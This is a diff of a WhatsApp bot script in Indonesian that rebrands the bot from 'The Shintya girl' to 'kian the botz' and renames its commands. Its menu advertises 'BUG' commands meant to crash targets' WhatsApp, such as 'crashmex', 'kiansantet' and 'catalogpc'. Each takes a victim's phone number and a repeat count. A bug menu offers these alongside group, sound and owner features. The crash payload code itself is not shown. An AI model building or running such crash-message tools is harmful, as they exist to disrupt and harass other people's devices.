+case 'kiansound141':
+case 'kiansound142':
+case 'kiansound143':
+case 'kiansound144':
+case 'kiansound145':
+case 'kiansound146':
+case 'kiansound147':
+case 'kiansound148':
+case 'kiansound149':
+case 'kiansound150':
+case 'kiansound151':
+case 'kiansound152':
+case 'kiansound153':
+case 'kiansound154':
+case 'kiansound155':
+case 'kiansound156':
+case 'kiansound157':
+case 'kiansound158':
+case 'kiansound159':
+case 'kiansound160':
+case 'kiansound161':
  if (isBan) throw sticBanLu(from)
 xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
@@ -4338,7 +4325,7 @@ m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
 break
-case 'zenghoib': case 'welcome': {
+case 'kianghoib': case 'welcome': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 
@@ -4481,19 +4468,7 @@ haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quote
 }
 }
 break
-//=================================================//
-
-// # BATAS # \\
-
-//=================================================//
-case 'owner': case 'crator': {
-if (isBan) throw sticBanLu(from)
-haikal.sendContact(m.chat, global.owner, m)
-}
-break
-//=================================================//
-/*
-case 'owner': {
+case 'kk': {
 if (isBan) throw sticBanLu(from)
 let buttons = [
 {buttonId: `bugmenu`, buttonText: {displayText: 'BUG MENU'}, type: 1},
@@ -4507,7 +4482,7 @@ jpegThumbnail:log0,
 caption: `
 ◎ Lib : Multi-Device
 ◎ Terbit : *01-09-1999*
-◎ Owner : © 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹
+◎ Owner : © 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯
 
 [ 𝗜𝗻𝗶 𝗮𝗱𝗮𝗹𝗮𝗵 𝗯𝗼𝘁 𝗱𝗮𝗿𝗶 𝗶𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮 🇮🇩 ]
 
@@ -4518,83 +4493,14 @@ headerType: 4
 }
 haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
-break*/
-//=================================================//
-case 'menu': {
-if (isBan) throw sticBanLu(from)
-haikal.sendMessage(m.chat, { image: kalimage, caption: `
-◎ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹
-◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
-◎ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏𝟎
- ///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
-///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
-///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
-///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
-///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
-///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
-///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
- ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-╭━━❍𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹❍━━╮
-┃╭━━━━━━━━━━━━━━━━╾•
-┃┃   ❍ 𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 𝗕𝗢𝗧 𝗖𝗥𝗔𝗦𝗛 ❍
-┃╰━━━━━━━━━━━━━━━━╾•
-┃ ┃ ╭┈────────────╮
-┃ ┃│⃟•╾ 𝗦𝗜𝗡𝗧𝗬𝗔𝗔𝗖𝗥𝗔𝗦𝗛➢
-┃ ┃ ╰┈────────────╯
-╰━━╼⃟݊⃟̥⃝̇݊݊⃟ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹𝙨 ݊⃟̥⃝̇݊⃟╾━━╯
- ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-╭━━❍𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹❍━━╮
-┃ ╭━━━━━━━━━━━━━━━━╮
-┃ ┃ ╭┈────────────╮
-┃ ┃ │ ❍ 𝑴𝑬𝑵𝑼_𝑨𝑼𝑻𝑶 ❍
-┃ ┃ ╰┈────────────╯
-┃ ╰━━━━━━━━━━━━━━━━╯
-┃╭━━━━━━━━━━━━━━━━╾•
-┃│⃟•╾ 𝐀𝐮𝐭𝐨𝐤𝐞𝐭𝐢𝐤 𝐨𝐧 / 𝐨𝐟𝐟
-┃│⃟•╾ 𝐀𝐮𝐭𝐨𝐯𝐧 𝐎𝐧 / 𝐎𝐟𝐟
-┃│⃟•╾ 𝐀𝐮𝐭𝐨𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐨𝐧 / 𝐨𝐟𝐟
-┃│⃟•╾ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐨𝐧 / 𝐨𝐟𝐟 [ Crash ]
-┃╰━━━━━━━━━━━━━━━╯
-┣━━━╼⃟݊⃟̥⃝̇݊݊⃟𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ݊⃟̥⃝̇݊⃟╾━━━•
-┃╭━━━━━━━━━━━━━━━━╾•
-┃┃   ❍ 𝑴𝑬𝑵𝑼 𝙈𝙊𝘿𝙎 ❍
-┃╰━━━━━━━━━━━━━━━━╾•
-┃╭━━━━━━━━━━━━━━━━╾•
-┃│⃟•╾ 𝐒𝐜𝐫𝐚𝐩𝐞𝐫𝐢𝐦𝐚𝐠𝐞➢
-┃│⃟•╾ 𝐀𝐬𝐮𝐩𝐚𝐧𝐦𝐚𝐭𝐚➢
-┃│⃟•╾ 𝐒𝐜𝐫𝐚𝐩𝐜𝐨𝐧𝐯𝐞𝐫𝐭➢
-┃│⃟•╾ 𝐍𝐬𝐟𝐰➢
-┃│⃟•╾ 𝐒𝐨𝐮𝐧𝐝𝐛𝐨𝐭➢
-┃│⃟•╾ 𝐅𝐮𝐧𝐧𝐦𝐞𝐧𝐮➢
-┃│⃟•╾ 𝐏𝐫𝐢𝐦𝐛𝐨𝐧𝐦𝐞𝐧𝐮➢
-┃│⃟•╾ 𝐈𝐬𝐥𝐚𝐦𝐢𝐲𝐚𝐡➢
-┃│⃟•╾ 𝐕𝐨𝐢𝐜𝐞𝐜𝐡𝐚𝐧𝐠𝐞𝐫➢
-┃│⃟•╾ 𝐁𝐞𝐫𝐢𝐭𝐚𝐧𝐞𝐰𝐬➢
-┃│⃟•╾ 𝐂𝐦𝐝𝐦𝐞𝐧𝐮➢
-┃│⃟•╾ 𝐬𝐞𝐚𝐫𝐜𝐡𝐦𝐞𝐧𝐮➢
-┃│⃟•╾ 𝐆𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮➢
-┃│⃟•╾ 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮➢
-┃│⃟•╾ 𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮➢
-┃╰━━━━━━━━━━━━━━━╯
-╰━━━╼⃟݊⃟̥⃝̇݊݊⃟ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ݊⃟̥⃝̇݊⃟╾━━━╯
- ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-© 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`, contextInfo:{"externalAdReply": {"title": `SC 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹`,"body": `Selamat ${salam} kak ${pushname}`,
-previewType: "PHOTO",
-showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCI7CT5uWyfMHMtbH-IV_6rg`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
-}
-}}, { quoted:m})
-}
 break
-//=================================================//
 case 'bugmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}
 
 ◎ 𝐎𝐰𝐧𝐞𝐫 : ${botname}
 ◎ 𝐋𝐢𝐛 : 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞
-◎ 𝐓𝐞𝐫𝐛𝐢𝐭 : *𝟎𝟏-𝟎𝟗-𝟏𝟗𝟗𝟗*
+◎ 𝐓𝐞𝐫𝐛𝐢𝐭 : *𝟎 -𝟎𝟗-𝟏𝟗𝟗𝟗*
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ^𝐁𝐔𝐆 𝐁𝐎𝐓 𝐕𝐈𝐏^
 ^𝐁𝐘 : ${botname}^
@@ -4620,117 +4526,117 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝐬𝐰 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝐛𝐨𝐤𝐞𝐩 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝐛𝐮𝐭𝐭𝐨𝐧 [𝐌𝐚𝐬𝐮𝐤𝐚𝐧 𝐭𝐞𝐱𝐭 𝐧𝐲𝐚]
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱
 ╔════[ 𝐕𝐈𝐏 ]═══════⊱
 ╠➤🗿 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤🌷 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐦𝐞𝐱𝐝𝐞𝐦𝐚𝐦 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟐𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟑𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟒𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟓𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝟔𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟏𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟐𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟑𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟒𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟓𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝟔𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐛𝐮𝐭𝐭𝐨𝐧𝐤𝐞𝐦𝐚𝐭𝐢𝐚𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐦𝐞𝐱𝐜𝐫𝐨𝐭 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╠➤𝐳𝐞𝐧𝐧𝐢𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐤𝐢𝐚𝐧𝐧𝐢𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐨𝐤𝐞𝐦𝐞𝐱 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐚𝐡𝐲𝐚𝐧𝐠𝐛𝐞𝐭𝐮𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐚𝐦𝐩𝐮𝐧𝐬𝐮𝐡𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔════[ 𝐁𝐔𝐆 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 ]══════⊱
 ╠➤𝐚𝐟𝐤 { 𝐤𝐚𝐬𝐢𝐡 𝐫𝐞𝐚𝐜𝐭𝐢𝐨𝐧𝐬 }
-╠➤𝐳𝐞𝐧𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
-╠➤𝐳𝐞𝐧𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
-╠➤𝐳𝐞𝐧𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
+╠➤𝐤𝐢𝐚𝐧𝐠𝐡𝐨𝐢𝐛 [ 𝐨𝐧 / 𝐨𝐟𝐟 ]
+╠➤𝐤𝐢𝐚𝐧𝐣𝐚𝐠𝐨𝐚𝐧 [ 𝐫𝐞𝐩𝐥𝐲 𝐭𝐚𝐫𝐠𝐞𝐭 ]
+╠➤𝐤𝐢𝐚𝐧𝐬𝐚𝐧𝐠𝐞 [ 𝐇𝐚𝐫𝐮𝐬 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 ]
 ╠➤𝐛𝐮𝐠𝐭𝐢𝐤𝐭𝐨𝐤 [ 𝐋𝐢𝐧𝐤 ] - 𝐁𝐮𝐠 𝐒𝐰
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹 ]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯 ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐁𝐔𝐆 𝐓𝐀𝐑𝐆𝐄𝐓 ]══════⊱
 ╠➤🔥 𝟔𝟐𝟖𝐱𝐱𝐱|𝟓|𝟓
 ╠➤ 𝐜𝐫𝐚𝐬𝐡𝐦𝐞𝐱 𝟔𝟐𝟖𝐱𝐱𝐱|𝟓|𝟓
-╠➤𝐳𝐞𝐧𝐬𝐤𝐮𝐲 𝟔𝟐𝟖𝐱𝐱𝐱
-╠➤𝐳𝐞𝐧𝐬𝐚𝐧𝐭𝐞𝐭 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
+╠➤𝐤𝐢𝐚𝐧𝐬𝐤𝐮𝐲 𝟔𝟐𝟖𝐱𝐱𝐱
+╠➤𝐤𝐢𝐚𝐧𝐬𝐚𝐧𝐭𝐞𝐭 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
 ╠➤𝐜𝐚𝐭𝐚𝐥𝐨𝐠𝐩𝐜 𝟔𝟐𝟖𝐱𝐱𝐱@𝐬.𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩.𝐧𝐞𝐭|𝟏𝟎|𝟏𝟎𝐬
-╚════[ 𝗧𝗵𝗲 𝗦𝗵𝗶𝗻𝘁𝘆𝗮 𝗴𝗶𝗿𝗹]══════⊱
+╚════[ 𝙠𝙞𝙖𝙣 𝙩𝙝𝙚 𝙗𝙤𝙩𝙯]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 𝐊𝐞𝐭𝐢𝐤 > 𝐦.𝐜𝐡𝐚𝐭 ( 𝐝𝐢 𝐠𝐫𝐨𝐮𝐩 𝐝𝐮𝐥𝐮🌷)
 ╔══════[ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ]══════⊱
